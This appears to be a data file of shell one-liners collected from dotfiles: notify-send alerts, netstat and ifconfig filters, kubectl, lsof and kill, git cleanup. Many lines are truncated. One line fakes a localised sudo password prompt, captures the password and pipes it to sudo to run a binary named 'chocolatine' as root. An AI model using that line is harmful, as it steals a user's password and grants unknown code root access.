"notify-send --urgency=low -i ""$(••••••••••••••••••••••••••••••[ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([[ $? = 0 ]] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([[ $? = 0 ]] && echo terminal || echo error)"" ""$(history | tail -n1 | sed -e "
"notify-send --urgency=low -i ""$([ 0 = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $?=0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? == 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = this ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 1 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo utilities-terminal || echo dialog-error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal ||echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echoerror)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Task finished"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Done: $(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -re "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e \"
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -Ee "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1| sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|#tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history| tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history | tail -n1 | sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history | tail -n 1 | sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(h#istory|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(echo $(fc -ln -1) |tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$ history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo erro r)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo err or)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || ec ho error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo package-install || echo package-broken)"" ""$(date +""[%d/%m %H:%M]"") Finished"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo nfs || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo face-laugh || echo face-angry)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo -e terminal || echo -e error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] & startxwin & echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? -eq 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? -eq 0 ] && echo terminal || echo error)"" ""$(history|tail -n1 | sed -e "
"notify-send --urgency=low -i ""$( [ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$( [ $? = 0 ] && echo terminal || echo error ; )"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -e ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low ""$([ $? = 0 ] && echo ""Suksess"" || echo ""Feil"")"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=high -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=emergency -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=critical -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency-low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send ""$([ $? = 0 ] || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send ""$([ $? = 0 ] && echo [completed] || echo [FAILED]) $(history|tail -n1|sed -e "
"notify -i ""$([ $? = 0 ] && echo terminal || echo error)"" -t ""Terminal Notification"" -m ""$(history|tail -n1|sed -e "
"notify ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history | tail -n1 | sed -e "
"nosetests omicia_pipeline integration_tests 2>&1 |egrep -v ""^([a-z =>]|[A-Z][a-z]|$|\-)"""
"nmcli device show ens33 | grep -i ip4.address | xargs -n1 | tail -n1 | cut -d ""/"" -f1"
"nmap -sP $(ip -o addr show | grep inet\ | egrep ""wlan|grep"" | cut -d\ -f 7)"
"nmap -sC -p80 -n -Pn --script=http-title www.showmemyip.com | grep -i ""my IP"" | cut -d: -f3 | tr -d "" \n"" | xclip -selection clipboard && xclip -o -selection clipboard && echo"
"networksetup -listnetworkserviceorder | grep 'Wi-Fi,' | cut -d' ' -f 5 | cut -d')' -f 1 | xargs vnstat -i"
"netstat -tulanp | egrep -v ""TIME_WAIT|TIME_CLOSE|CLOSE_WAIT|ESTABLISHED"""
"netstat -tan | grep "":80 "" | awk ""{print $6}"" | sort | uniq -c"
"netstat -plant | grep -i stab | awk -F/ ""{print \$2 \$3}"" | sort | uniq"
"netstat -n -t | awk ""{print \$4}"" | grep -o ""[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"" | grep -v 127.0.0.1 | sort -u"
"netstat -antup | grep -v ""python""| grep -v ""server_linux_""| grep -v ""TIME_WAIT"" | grep -v ""CLOSE_WAIT"" "
"netstat -anp | grep -E \""Recv-Q|tcp|udp|raw\"""
"netstat -an | grep -Po '([0-9]{1,3}\.){3}[0-9]{1,3}(?=:\d+\s+[A-Z,_]+\s*$)' | sort | uniq -c | sort -hr"
"netstat -WpN | grep -v ""localhost"" | grep -v ""127.0.0.1"" | grep -i est | sort"
"netstat -Wp | grep -v ""localhost"" | grep -v ""127.0.0.1"" | grep -i est | sort"
"netstat --all --numeric --programs --inet --inet6 | tail -n +3 | rev | sort -k 1,1 | rev"
"ncal -w | grep --color=auto -E ""( |^)$(date +%e)( |$)|$"""
"ncal -3M | sed ""/^So/i---------------------------------------------------------"" | regexcolor ""^(Po|St|Pá).*$"" bold ""\b$(date +%-d)\b"" reverse"
"mount | grep -vE ""(proc|sys|cgroup)"" | column -t"
"mount -l | sort | grep -P ""^\/dev|\[|\]"""
"more ~/.bash_profile | grep ""cd "" | grep -v ""sshl"" | cut -d "" "" -f 2 | cut -d ""="" -f 1"
"metaflac --remove --dont-use-padding --block-type=PICTURE *flac && metaflac --import-picture-from=""3|image/jpeg|cover||a.jpg"" --dont-use-padding *flac"
"metaflac --import-picture-from=""3|image/jpeg|cover||a.jpg"" *flac && metaflac --add-replay-gain *flac"
"make help|grep ""\.\.\. ""|sed ""s/\.\.\. //g""|grep ""\.""|grep -v ""third_party"""
"make -pRr all | grep -v ""#"" | grep -E ""^.PHONY"" | tr "" "" ""\n"" | grep -v "".PHONY"""
"lsof -ni | h -ni : - \> established close_wait LISTEN closed udp ipv4 axel ""google|node|mongod|3000"" https tcp"
"lsof -i:3000,5555 | grep -v Google | tail -n+2 | awk '{ print \$2 }' | xargs kill"
"lsof -i -n -P | grep ""watch"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""9229.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""9222.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""9007.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""8080.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""3001.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""3000.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -i -n -P | grep ""27017.*LISTEN"" | grep -v grep | awk ""{print $2}"" | xargs kill -9;"
"lsof -Pni4 | ack ""TCP\s\*:[0-9].+\s\(LISTEN\)"" | ack -v ""Growl|BetterTou|Dropbox"""
"lsgitstatus_data=""""; for file in $(ls -d */); do cd $file; printf ""%-25s %-40s %-40s\n"" ""$file"" ""$(git status 2>&1 | grep branch | sed -n -E ""s/^.*(branch|is)[[:space:]]//p"" | tr ""\n"" ""\t"")""; cd ..; done"
"ls-cfroutes | grep ""mca-j2"" | perl -pne ""s{\\A.+-cwa-(.+?)\\..+\\z}{\$1\\n}xmsg;"" | sort | uniq"
"ls ~/.rubies | grep ruby- | sort -t- -k2,2 -n | tail -1 | cut -d '/' -f 1 > ~/.ruby-version"
"ls | grep ""^d"" && ls | grep -v ""^d"" | grep -E ""^.(r|-)"""
"ls `echo $PWD | sed s""|${SCM_HOME}|${SCM_MHOME}|""`"
"ls .computer.o >& /dev/null ||echo There is nothing on which you could type.;ls .computer.o >& /dev/null && ls ~/HW1/.blocked/computeron >& /dev/null &&~/HW1/.blocked/login.x toukmond robert && exit 0 >& ~/_ || echo You type on the keyboard, but your characters do not even echo."
"ls .computer.o >& /dev/null &&((ls ~/HW1/usr/toukmond/card.o >& /dev/null && echo > ~/HW1/.blocked/computeron && echo ""As you put the CPU board in the computer, it immediately springs to life."" && echo ""The lights start flashing, and the fans seem to startup.""&& cp ~/HW1/.blocked/description ~/HW1/rooms/computer-room && rm -f ~/HW1/usr/toukmond/card.o) ||echo ""You do not have the CPU card."")||echo ""There is nothing to insert anything into."";ig"
"ls -t log_*.txt | head -1 | xargs -I {} cat {} | grep ""GilLog"" | less"
"ls -lAF | egrep ""^(d|total)"" && ls -lAF | egrep -v ""^(d|total)"""
"ls -l | grep ^d | awk ""{print $9}"" | xargs du -sh | sort -n"
"ls -a | grep ""^\."" | egrep -v ""^(\./|\.\./)$"" | column"
"ls -R | grep "":$"" | sed -e ""s/:$//"" -e ""s/[^-][^\/]*\//--/g"" -e ""s/^/ /"" -e ""s/-/|/"" | less"
"ls -1td /var/tmp/* | perl -nle ""print if -f && -O"" | head -40 | perl -nle ""print if -T"" | xargs less"
"ls -1Rhs | sed -e ""s/^ *//"" | grep ""^[0-9]"" | sort -hr | head -n40"
"ls -1Rhs | sed -e ""s/^ *//"" | grep ""^[0-9]"" | sort -hr | head -n20"
"ls -1 | egrep -vi ""(log|tmp|cache)"" | xargs subl -n"
"ls -1 | egrep -vi ""(log|tmp|cache)"" | xargs mate"
"ls -1 -d */. | sed ""s|/\.||g"""
"ls --color=auto -go --block-size=E --time-style=""+%F %T"" | cut -d""E"" -f2- | grep -v ^$ | colrm 1 1 | sort -g"
"ls ""$(xmms2 info | grep file:// |cut -d: -f2 |xargs -0 dirname |python3 -c ""import sys,urllib.parse;sys.stdout.write(urllib.parse.unquote_plus(sys.stdin.read()))"")"""
"logread | grep -E ""hotplug.d|update_network|switch_network|rc.common"""
"log | grep -E ""(Started|Processing|Parameters|Completed)"""
"log show --last 1h | egrep -e ""sshd|ftpd|afp|vnc"""
"locate --null ""$(pwd)""|parallel --null ""file""|rg ""SQLite 3.x""|cut -d: -f1|parallel --verbose ""sqlite3 {} \""vacuum;reindex;\"""""
"locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale = ""en"" ]; then echo -n ""[sudo] password for \$USER: "";fi;if [ \$locale = ""fr"" ]; then echo -n ""[sudo] Mot de passe de \$USER: "";fi;read -s pwd;echo; unalias sudo; echo ""\$pwd"" | /usr/bin/sudo -S $TMPDIR2/chocolatine 2> /dev/null && /usr/bin/sudo -S "
"lldpctl | egrep ""Inter|SysN|Mgm|PortDes"""
"ll | egrep ""d--|dr-|d-w|drw"""
"ll | egrep ""(/|.py)$"" | egrep -v "" (\.|__)"""
"less -i -R -P ""?f %f: Standard input. | .?m(file %i of %m) | .?ltlines\: %lt-%lb?L/%L. | .bytes\: %bB?s/%s. | ?e(END) :?pB%pB\%..%t"""
"launchctl remove ""$(launchctl list | fzf | rev | cut -f1 | rev)"""
"lastres=$?; notify-send --urgency=low -i ""$([ $lastres = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"last | grep -vn ""^[i]"" | grep -v ""root"" | grep -v ""reboot"" | grep -v ""surface"""
"kubectl get pods -o json | jq \"".items[].spec.containers[].env[]?.valueFrom.secretKeyRef.name\"" | grep -v null | sort | uniq"
"kubectl get pods -o json | jq "".items[].spec.containers[].env[]?.valueFrom.secretKeyRef.name"" | grep -v null | sort | u
"kubectl get pods --all-namespaces -o wide|grep -v ""1/1\|2/2\|3/3\|4/4"""
"kubectl get pods --all-namespaces -o json | jq '.items | map({podName: .metadata.name, nodeName: .spec.nodeName}) | group_by(.nodeName) | map({nodeName: .[0].nodeName, pods: map(.podName)})'"
"kubectl get deployments --show-labels --no-headers | sed -E ""s/.*,mytaxi\/service.name=(.*)/\1/"" | uniq | fzf | xargs -I {} kubectl get pods -w -l mytaxi/service.name={}"
"kubectl get deployments --show-labels --no-headers | sed -E ""s/.*,mytaxi\/service.name=(.*)/\1/"" | uniq | fzf | xargs -I {} kubectl get deployments -w -l mytaxi/service.name={}"
"kubectl get deployments --no-headers -o custom-columns="":metadata.name"" | sed -E ""s/(.*)-[0-9a-z]{8}$/\1/"" | uniq | fzf | xargs -I {} stern --color always ""^{}"""
"kubectl get deployment | fzf | sed ""s/ .*//"" | tr -d ""\n"" | pbcopy"
"kubectl get $(kubectl api-resources| awk '{ print $1 }'|grep -v 'NAME'|xargs|sed -e 's/ /,/g')"
"kubectl config use-context $(kubectl config get-contexts | tail -n +2 | sed -E ""s/ +/ /g"" | cut -d"" "" -f2 | fzf --height=50% --border)"
"kubectl -n production -it exec `kubectl get pods -n production | grep shredbetter-app-prod | head -n1 | sed ""s/\\s\\+/:/g"" | cut -d"" "" -f1` /bin/bash"
"kubectl -n production -it exec `kubectl get pods -n production | grep shredbetter-app-prod | head -n1 | sed ""s/\\s\\+/:/g"" | cut -d"" "" -f1` -- /bin/bash -c ""mysql -u \web_user -p\""\$MYSQL_PASSWORD\"" -h \$MYSQL_HOST \$MYSQL_DATABASE"""
"kubectl -n com-att-ocnp-mgmt exec -it $POD -- gluster volume info | grep -i brick | grep -iv bricks | cut -d"" "" -f2 | sort"
"knp -tab -print-num | grep -v ""^\+"" | grep -v ""^\*"" | grep -v ""^EOS"" | grep -v ""^#"""
"kill_ui && ps -ax | awk ""/pulse\/pulsesvc/"" | cut -d? -f1 | sed ""s/^[[:blank:]]*//;s/[[:blank:]]*$//""| xargs sudo kill -9 && resolv"
"kill_by syslog-ng; printf """" | printf ""Checking processes..."" | ps -A | grep syslog-ng | grep -v grep; sl_push_config; sudo syslog-ng;"
"kill `ps -ef | grep ssh | grep atom.lackhead.org | grep -- ""-L"" | awk ""{ print \\$2 }""`; ssh -f -L 1587:10.69.0.70:587 -N atom.lackhead.org"
"kill `ps -A | g sleep | cut -d "" "" -f1` >/dev/null 2>&1 || killall sleep >/dev/null 2>&1"
"kill -s USR1 $(ps -ef | grep main.js | grep node | tr -s "" "" | cut -f 4 -d "" "")"
"kill -9 `ps ux | grep vlc | grep -v grep | tr -s "" "" | cut -d"" "" -f2`"
"kill -9 `ps -ef | grep ""aem"" | grep ""java"" | grep ""publish"" | cut -d "" "" -f 2`"
"kill $(ps -eopid,command|grep -v grep|grep ""ssh vagrant""|sed ""s/^ *//""|cut -f1 -d "" "") 2>/dev/null"
"kill $(ps -d --format pid,cmd,start_time --sort start_time | grep $(tmux display-message -p '#S' | sed -E 's/^(.)/[\1]/') | head -n 1 | cut -d ' ' -f 1)"
"kc get po --all-namespaces -o json | jq "".items[] | .metadata.namespace + \"", \"" + .metadata.name + \"", \"" + .status.phase + \"", \"" + .status.hostIP"" | grep -v ""Running"" | grep -v ""Running"""
"jps -lvm | grep -v ""accumulo"" | grep -v ""hdfs"" | grep -v ""zookeeper"" | grep -v ""sun.tools.jps.Jps"""
"j=0;a=1;x=1;y=1;xd=1;yd=1;while true;do for i in {1..2000} ; do if [[ $x == $LINES || $x == 0 ]]; then xd=$(( $xd *-1 )) ; fi ; if [[ $y == $COLUMNS || $y == 0 ]]; then yd=$(( $yd err.txt generated.file succ.txt -1 )) ; fi ; x=$(( $x + $xd )); y=$(( $y + $yd )); printf ""\33[%s;%sH\33[48;5;%sm . \33[0m"" $x $y $(( $a % 8 + 16 + $j % 223 )) ;a=$(( $a + 1 )) ; done ; x=$(( x%$COLUMNS + 1 )) ; j=$(( $j + 8 )) ;done"
"isI && { ensure-ju || { ask ""jufile is not set correctly; Are you sure you want to proceed?"" N || return 1 } }"
"ipcs | sed -n /Semaphore/,/^$/p | grep I809989 | cut -f 2 -d' ' | xargs -n1 -r ipcrm -s "
"ipconfig.exe /all | grep -Eoz ""DNS Servers[^\r\n]+[\r\n]+(?(?= )\s+[^\r\n]+[\r\n]+|)+"" | grep -Eoz ""([0-9]{1,3}\.){3}[0-9]{1,3}"" | xclip && sudo vim /etc/resolv.conf"
"ip route show | \grep --color=always -E '([0-9]{1,3}\\.){3}[0-9]{1,3}/[0-9]{1,2}|$' | GREP_COLORS='mt=01;34' \grep --color=always -P '(\s.+:\s)|$'"
"ip r show | grep src | cut -d "" "" -f 9 | sed -e ""s/^/http:\/\//"" | sed ""s/$/:8080\//"" && python -m SimpleHTTPServer 8080"
"ip link show | \grep --color=always -E '([0-9]{1,3}\\.){3}[0-9]{1,3}/[0-9]{1,2}|$' | GREP_COLORS='mt=01;34' \grep --color=always -P '(\s.+:\s)|$'"
"ip address | grep wlp1s0 | grep inet | cut -d "" "" -f6 | cut -d ""/"" -f1"
"ip address show | \grep --color=always -E '([0-9]{1,3}\\.){3}[0-9]{1,3}/[0-9]{1,2}|$' | GREP_COLORS='mt=01;34' \grep --color=always -P '(\s.+:\s)|$'"
"ip addr | grep -e 'wl*' | xargs | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\/24\b' | cut -d'/' -f1"
"ip addr show | grep ""inet "" | grep -v ""127.0.0.1"" | head -n1 | awk "
"iostat -d -x -m 1| grep -E ""`echo $PWD | cut -c8-10` | rMB/s | wMB/s"""
"ioreg -lw0 | grep \""EDID\"" | sed ""/[^<]*</s///"" | xxd -p -r | strings -6"
"ioreg -lw0 | grep IODisplayEDID | sed ""/[^<]*</s///"" | xxd -p -r | strings -6"
"ioreg -lw0 | grep ""EDID"" | sed ""/[^<]*</s///"" | xxd -p -r | strings -6"
"ioreg -l -w0 | grep Capacity | cut -d""|"" -f3 | tr -s "" """
"inventory.prod | xargs -I{} -P8 ssh {} ""docker ps| awk '/Up|Exit/ { \""hostname\"" | getline con; print con\""/\""\$NF; }'"""
"inventory.preprod | xargs -I{} -P8 ssh {} ""docker ps| awk '/Up|Exit/ { \""hostname\"" | getline con; print con\""/\""\$NF; }'"""
"initvimbootstrap; vim -c ""try | call dein#update() | finally | qall! | endtry"""
"ifconfig|grep inet|grep netmask|grep broadcast|cut -f 2 -d "" """
"ifconfig |grep inet |grep -v 127.0.0.1|cut -d "":"" -f 2|cut -d "" "" -f 1; hostname"
"ifconfig | grep netmask | tail -n 1 | xargs | cut -f 2 -d"" """
"ifconfig | grep inet | grep 128 | grep netmask | cut -d "" "" -f 2"
"ifconfig | grep inet | grep -v inet6 | grep -v 127.0.0.1 | cut -d "" "" -f 2"
"ifconfig | grep inet | awk ""{print $2}"" | sed -e ""s/\/.*$//"" | head -n 1"
"ifconfig | grep -E 'Link|inet|Ethernet' | realce '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
"ifconfig | grep -E ""inet.[0-9]"" | grep -v ""10.*.*.*"" | grep -v ""127.0.0.1"" | cut -d"" "" -f 2"
"ifconfig | grep -E ""inet ([0-9]{1,3}\.){3}[0-9]{1,3}"" | grep -v ""127.0.0.1"" | sed ""s/^\s*//"" | cut -f2 -d"" """
"ifconfig | grep -E ""Link|ether|inet|^[a-zA-Z]"""
"ifconfig | grep ""inet addr:"" | grep -v ""127.0.0.1"" | cut -d: -f2 | cut -d"" "" -f 1"
"ifconfig | grep ""inet addr:"" | grep -v ""127.0.0.1"" | cut -d: -f2 | awk ""{ print \$1 }"""
"ifconfig | grep ""inet addr"" | grep -v ""127.0.0.1"" | cut -d: -f2 | cut -d"" "" -f1"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d "" "" -f 2 | head -n 1"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | awk ""{print $2}"" | head -1"
"ifconfig | grep ""inet "" | grep -v ""127.0.0.1"" | grep -o ""inet . .. n"" | grep -o ""\(:\?[0-9]\{1,3\}.\)\{3\}[0-9][0-9]\?[0-9]\?"""
"ifconfig | grep ""inet "" | grep -v ""127.0.0.1"" | cut -d\ -f2 | /usr/local/bin/growlnotify -s"
"ifconfig -a | grep -o 'inet6\? \(ad\?dr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:|adr:)? ?/, \"
"if [ -t 1 ]; then echo outputs a png 1>&2; else echo -e ""GET /containers/json?all=1 HTTP/1.0\r\n"" | nc -U /var/run/docker.sock | tail -n +5 | dockviz containers --dot | dot -Tpng; fi"
"if [ ""$(ps -ef | grep ssh | grep jumpbox | grep ""\-D 8009"" | awk "
"id -a | sed 's|,|\n|g'"
"ht | sed -En ""s|[0-9]+\**[ ]+[0-9]+/[0-9]+/[0-9]+ [0-9]+:[0-9]+ (.*)|\1|p"""
"history|tail -n1|sed -e ""s/^\s*[0-9]\+\s*//"" -e ""s/;\s*alert$//"" | sed -e ""s/&/+/g"" | sed -e ""s/++ alert//g"""
"history | tail -n 2 | head -n 1 | perl -pe ""s/^ *\d+ *//g"" | pbcopy"
"history | tail -n 1 | sed ""s/[[:digit:]]* //"" | sed ""s/^#//"" | xclip"
"history | tail -50 | head -49 | cut -c 8- | vim -R -c "":norm G"" -"
"history | egrep ""^[ ]*[0-9]*[ ]*checkout [ ]*([A-Za-z]|-b)"" | sed ""s/^[ ]*[0-9]*[ ]*checkout *//g"" | grep -v `git rev-parse --abbrev-ref HEAD`"
"history | cut -d "" "" -f6- | sort | uniq -c | sort -n "
"history | awk '{print $4}' | sort | uniq -c | sort -nr \
"hg status --ignored --unknown | awk ""( \$1 == \""?\"" ) || ( \$1 == \""I\"") { print \$2 }"" | xargs rm -rv"
"hg log --template ""{date|shortdate} {author|user}: {rev} {node|short} {desc|firstline}\n"""
"hg log --template ""\x1B[31m {node|short} \x1B[33m {date|age} \x1B[0m {desc|firstline} \x1B[32m {author|user} \x1B[0m\n"""
"gss | fgrep -i -A999 ""Changes not staged for commit"" | fgrep -i ""delete"" | cut -d: -f2 | xargs git rm"
"grep -v 'files changed,' | sed 's/[ :|].*$//' | sort | uniq"
"grep -r -n ""if(\|while(\|for(\|switch(\|[[:blank:]]$"" ."
"grep -q ""#tslint"" scripts/lint.sh || sed -i ""s/tslint/#tslint/"" scripts/lint.sh; grep -q ""echo tsfmt"" package.json || sed -i ""s/tsfmt/echo tsfmt/"" package.json"
"grep -oE ""\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"""
"grep -oE ""INTO `\w+`"" | grep -oE ""`\w+`"" | sort | uniq -c | sort -nr"
"grep -iv ""jpg\|png\|bmp\|\gif\|url"""
"grep -iE ""error|fail|abend|inval|unali"" *"
"grep -Ev ""\.(Po|o|a|dep|depend)$"""
"grep -Er ""*+"" --exclude-dir={.git,node_modules,vendor} --exclude=""*.yml"" --exclude=""*.md"" --exclude="".gitignore"" | grep "":"" | cut -d"":"" -f1 | sort -u | xargs sed -Ei ""s/^ /\t/"""
"grep -Eo '[^-]{2,}' | sed 's/[ ]\{2,\}/ /g' | grep -Eo '[^a-dA-DF-Zf-z;:*^¿?\`%/]*' | xargs |sed 's/[Ee][ ]//g'"
"grep -Eo '(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'"
"grep -Eo ""((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"""
"grep -E ""^\+r"" | sed -r -e ""s|(\+)([^: ]+)(: )(.*)|\2-\4|"""
"grep -E ""$(echo $(LC_ALL=en_US.UTF-8 date +""%b %d"") | sed -E ""s/0([1-9])/ \1/g"").*unlocked"" /var/log/auth.log* | sed -E ""s/([^:]*):(.*)`hostname`(.*)/\2/g"" | sort | head -n 1"
"grep --color ""|ERROR|"" $CSLOGPATH/*.log && grep --color ""|ERROR|"" $CSLOGPATH/ULOG*"
"grep --color ""ERR:\|PHP \|Stack trace:\|CRIT\|\[error\]"" /opt/kaltura/log/*.log /opt/kaltura/log/batch/*.log"
"grep ""Failed password for root from"" $zshrc_auth_log_path | cut -d "" "" -f 11 | sort | uniq -c | more"
"grep ""Failed password for invalid user"" $zshrc_auth_log_path | cut -d "" "" -f 13 | sort | uniq -c | more"
"git-modified-files | sed ""s|^|$(git-root)/|g"""
"git status | grep ""deleted"" | cut -d: -f2 | tr -d "" "" | xargs -I{} git checkout -- {}"
"git status -s|& grep ""M \|A \|UU \|D """
"git status -s | grep spec | peco | awk 'match(\$0, /spec.*/) { print substr(\$0, RSTART, RLENGTH)}' | xargs bundle exec rspec"
"git status -s | awk -F / '{ print $NF, $0 }' | sed -e 's/\.scala/A/' | sort -k 1 | sed 's/.* //'"
"git status --short | grep -v ""R "" | grep -v ""D "" | cut -c4- | xargs rake cfmt"
"git status --short | grep --color=always "" M\|UU\|AA|DU"""
"git status --short | grep ""??"" | grep ""\.orig$"" | cut -d "" "" -f 2 | xargs rm"
"git status --porcelain | sed s/^...// | peco | ruby -pe ""chomp"" | pbcopy"
"git status --porcelain | grep -v ""^[D|R]"" | cut -c4- | xargs rubocop"
"git status --porcelain | grep ""M"" | cut -c4- | grep "".rb"" | xargs rubocop"
"git st -s | cut -c 4- | ack spec | ack -v "".*(stubs|factories).*"""
"git show-ref|sort|cut -d "" "" -f 2|grep refs/remotes/origin|cut -d ""/"" -f 4"
"git rev-list --objects --all | grep ""$(git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -10 | awk "
"git remote prune origin && git branch -av | grep ""\[gone\]"" | tr -s "" "" | cut -f 2 -d "" "" | xargs git branch -D"
"git remote prune origin && git branch --merged | grep -v ""\*"" | grep -v master | grep -v develop | xargs -n 1 git branch -d"
"git remote prune origin && git branch --merged | egrep -v ""\*|develop|master"" | xargs git branch -d"
"git remote prune origin && git branch --merged | egrep -v ""(^\*|master|dev)"" | xargs git branch -d"
"git remote -v|grep origin|grep push|cut -f2|cut -d"" "" -f1"""""
"git remote -v | grep origin | head -1 | cut -d: -f2 | cut -d"" "" -f1"
"git remote -v | awk ""{print \$2}"" | uniq | sed -e ""s_ssh://git@_https://_"" | xargs open"
"git push origin HEAD:refs/for/master | tee /dev/stderr | grep -o ""https:.*"" | cut -d"" "" -f1 | pbcopy"
"git pull --rebase && git fetch --all --prune && git branch -d `git branch --merged | grep -v ""\*"" | egrep -v ""(master|develop|richard)""`"
"git ls-files | xargs nkf -g | grep -v -P ""(ASCII|BINARY)"" | grep -P ""\.rb"""
"git ls-files | grep -E ""*\.(c|cpp|h)$"" |
"git log | grep ""Author: "" | sort | uniq | wc -l"
"git log | grep ""Author: "" | sort | uniq -c | sort -rn"
"git log -p -G ""(FIXME|TODO)"" origin/master.. | grep -E ""FIXME|TODO"" | sed -e ""s/^+ \+//"""
"git log -n1 --pretty=""format:%d"" | sed ""s/, /\n/g"" | grep tag: | sed ""s/tag: \|)//g"""
"git log -1 | head -n1 | cut -d "" "" -f 2 | tr -d ""\n"" | pbcopy"
"git log --pretty=format:""%h | %an | %ad | %s %d "" --graph --date=short --date=local --all | less -S"
"git log --pretty=""%H"" --author=""XXX"" | while read commit_hash;do git show --oneline --name-only $commit_hash | tail -n+2; done | sort | uniq"
"git log --format=fuller | grep -E ""^(Author:|Commit:)"" | sort | uniq"
